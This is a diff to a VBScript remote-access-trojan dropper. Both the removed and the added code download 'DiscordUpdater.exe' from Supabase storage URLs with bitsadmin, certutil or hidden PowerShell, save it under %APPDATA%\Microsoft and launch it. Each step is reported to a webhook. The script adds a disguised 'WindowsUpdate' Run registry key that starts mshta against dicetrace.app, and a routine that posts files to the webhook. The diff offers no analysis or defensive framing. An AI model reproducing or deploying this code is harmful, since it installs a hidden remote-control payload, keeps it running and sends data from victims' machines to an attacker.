@@ -144,35 +144,29 @@ End Sub
 
 ' --- DropRAT ---
 Sub DropRAT()
-    Dim dl:   dl   = "https://tvouyfmncjaujhkbvwjq.supabase.co/storage/v1/object/public/Trixie/Untitled%20folder/DiscordUpdater.exe"
-    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
+    Dim appData: appData = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft"
+    Dim temp: temp = appData & "\DiscordUpdater.exe"
+    
+    Dim dl: dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
+    
+    If fso.FileExists(temp) Then fso.DeleteFile temp
 
-    If fso.FileExists(temp) Then fso.DeleteFile temp, True
+    Call PostEmbed("📦 RAT Download", "Fetching payload...", 3447003)
 
-    ' method 1 — bitsadmin
-    sh.Run "bitsadmin /transfer dl /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-
-    ' method 2 — certutil fallback
-    If Not fso.FileExists(temp) Then
-        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    End If
-
-    ' method 3 — powershell fallback
-    If Not fso.FileExists(temp) Then
-        sh.Run "powershell -NoP -NonI -W Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & dl & "','" & temp & "')""", 0, True
-    End If
-
+    sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
+    
     If fso.FileExists(temp) Then
-        If fso.GetFile(temp).Size > 10000 Then
-            sh.Run Chr(34) & temp & Chr(34), 0, False
-            Call PostEmbed(":white_check_mark: RAT", "Executed successfully", 65280)
-        Else
-            Call PostEmbed(":x: RAT", "File too small, download corrupt", 16711680)
-        End If
+        Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
+        
+        sh.CurrentDirectory = appData
+        
+        ' THE FIX: Launch it visibly via CMD so it doesn't get silently killed
+        sh.Run "cmd.exe /c start """" """ & temp & """", 1, False
+        
+        Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed(":x: RAT", "All download methods failed", 16711680)
+        Call PostEmbed("⌛ RAT Error", "Download failed.", 16711680)
     End If
-End Sub
 End Sub
 
 ' --- Sleep Functions ---
@@ -187,8 +181,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    ' Added https:// to the payload
-    Dim payload : payload = "mshta https://dicetrace.app"
+    Dim payload : payload = "mshta dicetrace.app"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -271,7 +264,7 @@ Sub PostFile(fn, ct)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.SetRequestHeader "Content-Type: multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
 End Sub
